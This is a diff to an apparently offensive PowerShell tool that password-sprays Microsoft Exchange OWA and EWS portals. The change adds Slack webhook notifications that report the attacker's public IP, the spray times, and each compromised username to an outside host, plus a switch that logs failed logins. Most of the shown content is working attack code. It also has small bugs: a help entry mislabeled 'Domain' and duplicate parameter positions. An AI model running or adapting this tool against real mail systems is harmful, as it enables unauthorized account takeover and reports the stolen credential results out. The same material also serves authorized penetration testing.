@@ -1630,7 +1630,8 @@ function Invoke-PasswordSprayOWA{
     $Domain = ""
 
   )
-    
+
+	
     Write-Host -ForegroundColor "yellow" "[*] Now spraying the OWA portal at https://$ExchHostname/owa/"
     $currenttime = Get-Date
     Write-Host -ForegroundColor "yellow" "[*] Current date and time: $currenttime"
@@ -1797,6 +1798,15 @@ function Invoke-PasswordSprayEWS{
 
         Specify a domain to be used with each spray. Alternatively the userlist can have users in the format of DOMAIN\username or username@domain.com
 
+    .PARAMETER Domain
+
+        Specify slack incoming webook URL : https://hooks.slack.com/services/XXXXXXXXXXXXXXXXXXXXX/YYYYYYYYYYY/ZZZZZZZZZZ. Provide the X/Y/Z section as a parameter.
+
+
+    .PARAMETER Audit
+
+        Enable tracking of login failures
+
   .EXAMPLE
 
     C:\PS> Invoke-PasswordSprayEWS -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Fall2016 -Threads 15 -OutFile sprayed-ews-creds.txt
@@ -1835,12 +1845,30 @@ function Invoke-PasswordSprayEWS{
 
     [Parameter(Position = 6, Mandatory = $False)]
     [string]
-    $Domain = ""
-
+    $Domain = "",
+	
+	[Parameter(Position = 6, Mandatory = $False)]
+    [string]
+    $Slack = "",
+	
+    [switch]
+    $Audit
   )
     Write-Host -ForegroundColor "yellow" "[*] Now spraying the EWS portal at https://$ExchHostname/EWS/Exchange.asmx"
     $currenttime = Get-Date
+	$timezone = [System.TimeZoneInfo]::FindSystemTimeZoneById("Eastern Standard Time")
+	$starttime = [System.TimeZoneInfo]::ConvertTimeFromUtc((Get-Date).ToUniversalTime(), $timezone)
+	if ($Slack -ne ""){
+	
+	$ip = (Invoke-WebRequest -uri ifconfig.me -UseBasicParsing).Content
+	$requeststring = "Spray Source IP Address: $ip\nSpray Started at: $starttime"
+	$body=(@{text=$requeststring}|ConvertTo-Json).Replace('\\n','\n')
+	curl -method POST -body $body https://hooks.slack.com/services/$Slack -UseBasicParsing  | Out-Null
+	}
     Write-Host -ForegroundColor "yellow" "[*] Current date and time: $currenttime"
+	if($Audit.IsPresent){
+		Write-Host -ForegroundColor "yellow" "[*] Verbose mode is enabled"
+	}
     #Running the LoadEWSDLL function to load the required Exchange Web Services dll
     $Usernames = Get-Content $UserList
     $count = $Usernames.count
@@ -1908,18 +1936,20 @@ function Invoke-PasswordSprayEWS{
             $service = New-Object Microsoft.Exchange.WebServices.Data.ExchangeService($ServiceExchangeVersion)
             ForEach($UserName in $args[0])
             {
-                
+				$failure = $true
                 $userPassword = $args[1]
                 $ExchHostname = $args[2]
                 $Mailbox = $args[3]
                 $Password = $args[5]
                 $Domain = $args[7]
+				$Audit = $args[8]
+				$Slack = $args[9]
+				
 
                 if ($Domain -ne "")
                 {
                 $UserName = ("$Domain" + "\" + "$UserName")
                 }
-
                 #converting creds to use with EWS
                 $remotecred = New-Object System.Management.Automation.PSCredential -ArgumentList $UserName,$userPassword
                 $service.UseDefaultCredentials = $false
@@ -1931,9 +1961,15 @@ function Invoke-PasswordSprayEWS{
                 $FolderId = New-Object Microsoft.Exchange.WebServices.Data.FolderId( $rootfolder, $mbx)   
                 try
                 {
-                    $Inbox = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($service,$FolderId) 
-                    Write-Output "[*] SUCCESS! User:$username Password:$Password"
-                }
+                    $Inbox = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($service,$FolderId)		
+					Write-Output "[*] SUCCESS! User:$username Password:$Password"
+					$failure=$false
+					if ($Slack){
+						$requeststring = "Success - $username"
+						$body=(@{text=$requeststring}|ConvertTo-Json).Replace('\\n','\n')
+						curl -method POST -body $body https://hooks.slack.com/services/$Slack -UseBasicParsing  | Out-Null
+					}
+				}
                 catch
                 {
                     $ErrorMessage = $_.Exception.Message
@@ -1944,18 +1980,21 @@ function Invoke-PasswordSprayEWS{
                         Write-Output "[*] Some options to try: Exchange2007_SP1, Exchange2010, Exchange2010_SP1, Exchange2010_SP2, Exchange2013, or Exchange2013_SP1."
                         break
                     }
+					if($Audit -And $failure){
+						Write-Host "[-] LOGIN_FAILURE User:$username"
+					}
+					
                 }   
-   
-
+	
             }
-        } -ArgumentList $userlists[$_], $userPassword, $ExchHostname, $Mailbox, $ExchangeVersion, $Password, $UncompressedFileBytes, $Domain | Out-Null
+        } -ArgumentList $userlists[$_], $userPassword, $ExchHostname, $Mailbox, $ExchangeVersion, $Password, $UncompressedFileBytes, $Domain, $Audit, $Slack | Out-Null
     
     }
-    $Complete = Get-Date
+	$Complete = Get-Date
     $MaxWaitAtEnd = 10000
     $SleepTimer = 200
         $fullresults = @()
-    
+    $count = 0
     While ($(Get-Job -State Running).count -gt 0){
         $RunningJobs = ""
         ForEach ($Job  in $(Get-Job -state running)){$RunningJobs += ", $($Job.name)"}
@@ -1968,9 +2007,18 @@ function Invoke-PasswordSprayEWS{
             $JobOutput = Receive-Job $Job
             Write-Output $JobOutput
             $fullresults += $JobOutput
+			$count += 1
         }
 
 }
+	if ($Slack -ne ""){
+	$timezone = [System.TimeZoneInfo]::FindSystemTimeZoneById("Eastern Standard Time")
+	$completetime = [System.TimeZoneInfo]::ConvertTimeFromUtc((Get-Date).ToUniversalTime(), $timezone)
+	$count = $fullresults.count
+	$requeststring = "Spray Completed at: $completetime\nTotal Valid Creds: $Count"
+	$body=(@{text=$requeststring}|ConvertTo-Json).Replace('\\n','\n')
+	curl -method POST -body $body https://hooks.slack.com/services/$Slack -UseBasicParsing  | Out-Null
+	}
     Write-Output ("[*] A total of " + $fullresults.count + " credentials were obtained.")
     if ($OutFile -ne "")
     {
